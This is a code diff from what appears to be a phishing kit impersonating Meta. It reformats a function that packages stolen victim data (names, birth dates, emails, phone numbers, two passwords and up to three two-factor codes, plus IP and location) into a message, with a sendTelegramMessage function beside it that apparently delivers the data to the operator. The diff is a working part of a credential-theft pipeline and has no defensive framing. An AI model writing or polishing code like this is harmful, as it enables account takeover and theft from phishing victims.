@@ -155,25 +155,36 @@ function mergeData(oldData: any = {}, newData: any = {}) {
 
 function formatMessage(data: any): string {
     const d = normalizeData(data);
-    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
-    return `
-<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
-<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
------------------------------
-<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
-<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
-<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
------------------------------
-<b>Email:</b> <code>${escapeHtml(d.email)}</code>
-<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
-<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
------------------------------
-<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
-<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
------------------------------${authLine}
-<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
-<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
-<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
+    const dob = [d.day, d.month, d.year].every(Boolean)
+        ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
+        : '-';
+    const authLine = d.authMethod ? `\n<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
+
+    return [
+        `<b>📋 META VERIFIED - CASE SUMMARY</b>`,
+        `--------------`,
+        `<b>🖥️ SYSTEM</b>`,
+        `<b>IP:</b> <code>${escapeHtml(d.ip || 'N/A')}</code>`,
+        `<b>Location:</b> <code>${escapeHtml(d.location || 'N/A')}</code>`,
+        `--------------`,
+        `<b>👤 PROFILE</b>`,
+        `<b>Full Name:</b> <code>${escapeHtml(d.fullName || '-')}</code>`,
+        `<b>Page:</b> <code>${escapeHtml(d.fanpage || '-')}</code>`,
+        `<b>DOB:</b> <code>${dob}</code>`,
+        `--------------`,
+        `<b>📨 CONTACT</b>`,
+        `<b>Email:</b> <code>${escapeHtml(d.email || '-')}</code>`,
+        `<b>Business Email:</b> <code>${escapeHtml(d.emailBusiness || '-')}</code>`,
+        `<b>Phone:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : '-'}</code>`,
+        `--------------`,
+        `<b>🔐 SECURITY</b>`,
+        `<b>Password(1):</b> <code>${escapeHtml(d.password || '-')}</code>`,
+        `<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond || '-')}</code>`,
+        `${authLine ? authLine.trim() : ''}`,
+        `<b>2FA(1):</b> <code>${escapeHtml(d.twoFa || '-')}</code>`,
+        `<b>2FA(2):</b> <code>${escapeHtml(d.twoFaSecond || '-')}</code>`,
+        `<b>2FA(3):</b> <code>${escapeHtml(d.twoFaThird || '-')}</code>`
+    ].filter(Boolean).join('\n');
 }
 
 export async function sendTelegramMessage(data: any): Promise<void> {
